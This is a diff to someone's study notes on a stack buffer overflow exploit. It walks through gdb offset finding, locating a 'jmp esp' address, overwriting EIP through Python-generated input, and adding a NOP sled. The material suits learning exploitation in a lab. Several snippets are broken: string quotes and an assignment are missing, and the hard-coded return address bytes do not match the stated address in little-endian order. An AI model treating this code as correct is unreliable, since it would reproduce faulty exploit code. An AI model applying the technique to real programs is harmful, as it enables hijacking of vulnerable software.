@@ -214,13 +214,67 @@ Buffer Overflow
             file <program>  #run
             run
             {copy and paste pattern}
-            pattern_offset <whatever EIP was>       #62
+            pattern_offset <whatever EIP was>       #This is the buffer size (62 for this example)
 
             pattern_create <len of new pattern>
 
             break * main
             info proc map           #list of accessible areas in memories
             asmsearch "jmp esp"     #find virtual memory addr that points to jmp esp (ffe4)
+            
+
+
+
+            Examine command https://visualgdb.com/gdbreference/commands/x                
+                #examine memory that program has access to
+                #x - examine    /   1x  - one 32 bit hex addr   <address>   - from this address
+                x/1x <EIP addr or whatever>     #displays whats inside
+                x/1i <EIP..>                    #displays instruction in that addr
+                x/40x $esp                      #40 32 bit memory addr from esp (displays stack)
+
+            1.) Create a buffer: 
+
+            Python:
+                buffer = A * 62 #buffer size
+                print(buffer)
+            python3 exploit.py > exp        #save output to file
+
+            run < exp       #send exp into stdin for program. 
+            
+            2.) Find and add a memory address to jump to esp (trying to overwrite EIP w/ the jmp esp)
+
+            #use asmsearch
+            Python: #compile w/ python not python3
+                buffer 'A' * 62
+                #0x56555683
+                #0x56556683 these are 2 mem addr w/ jmp esp
+                esp = b'\x56\x83\x56\x55'        #converted from little endian
+
+                print(buffer + esp)
+
+            file <program>
+            breakpoint * 0x56555683            
+            r < exp
+
+            3.) NOP sled
+
+            Python:
+                buffer 'A' * 62
+                #0x56555683
+                #0x56556683 these are 2 mem addr w/ jmp esp
+                esp = b'\x56\x83\x56\x55'        #converted from little endian
+
+                nop = b'\x90' * 32  #nop sled                
+
+                print(buffer + esp + nop)
+
+
+
+
+
+
+
+
 
 
 
